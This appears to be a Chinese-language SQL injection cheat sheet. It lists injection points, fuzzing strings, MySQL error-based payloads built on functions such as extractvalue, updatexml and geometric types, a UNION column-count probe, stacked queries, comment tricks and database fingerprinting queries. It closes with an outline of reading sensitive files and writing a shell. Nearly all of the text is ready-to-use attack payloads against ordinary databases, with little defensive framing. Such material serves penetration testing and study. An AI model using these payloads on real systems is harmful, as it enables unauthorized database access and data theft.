注入检测
=====================================

常见的注入点
--------------------------------------
- GET/POST/PUT/DELETE参数
- X-Forwarded-For
- 文件名

Fuzz注入点
--------------------------------------
- ``'`` / ``"``
- ``1/1``
- ``1/0``
- ``and 1=1``
- ``" and "1"="1``
- ``and 1=2``
- ``or 1=1``
- ``or 1=``
- ``' and '1'='1``
- ``+`` ``-`` ``^`` ``*`` ``%`` ``/`` 
- ``<<`` ``>>`` ``||`` ``|`` ``&`` ``&&``
- ``~``
- ``!``
- ``@``
- 反引号执行

测试用常量
--------------------------------------
- ``@@version``
- ``@@servername``
- ``@@language``
- ``@@spid``

测试列数
--------------------------------------
例如 ``http://www.foo.com/index.asp?id=12+union+select+null,null--`` ，不断增加 ``null`` 至不返回

报错注入
--------------------------------------
- ``select 1/0``
- ``select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a``
- ``extractvalue(1, concat(0x5c,(select user())))``
- ``updatexml(0x3a,concat(1,(select user())),1)``
- ``exp(~(SELECT * from(select user())a))``
- ``ST_LatFromGeoHash((select * from(select * from(select user())a)b))``
- ``GTID_SUBSET(version(), 1)``

基于geometric的报错注入
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``GeometryCollection((select * from (select * from(select user())a)b))``
- ``polygon((select * from(select * from(select user())a)b))``
- ``multipoint((select * from(select * from(select user())a)b))``
- ``multilinestring((select * from(select * from(select user())a)b))``
- ``LINESTRING((select * from(select * from(select user())a)b))``
- ``multipolygon((select * from(select * from(select user())a)b))``

其中需要注意的是，基于exp函数的报错注入在MySQL 5.5.49后的版本已经不再生效，具体可以参考这个 `commit 95825f <https://github.com/mysql/mysql-server/commit/95825fa28a7e84a2f5dbdef5241078f7055c5b04>`_ 。

而以上列表中基于geometric的报错注入在这个 `commit 5caea4 <https://github.com/mysql/mysql-server/commit/5caea4a995130cd7c82574acc591ff7c46d9d978>`_ 中被修复，在5.5.x较后的版本中同样不再生效。

堆叠注入
--------------------------------------
- ``;select 1``

注释符
--------------------------------------
- ``#``
- ``--+``
- ``/*xxx*/``
- ``/*!xxx*/``
- ``/*!50000xxx*/``

判断过滤规则
--------------------------------------
- 是否有trunc
- 是否过滤某个字符
- 是否过滤关键字
- slash和编码

获取信息
--------------------------------------
- 判断数据库类型
    - ``and exists (select * from msysobjects ) > 0`` access数据库
    - ``and exists (select * from sysobjects ) > 0`` SQLServer数据库

- 判断数据库表
    - ``and exsits (select * from admin)``

- 版本、主机名、用户名、库名
- 表和字段
    - 确定字段数
        - Order By
        - Select Into
    - 表名、列名

测试权限
--------------------------------------
- 文件操作
    - 读敏感文件
    - 写shell
- 带外通道
    - 网络请求
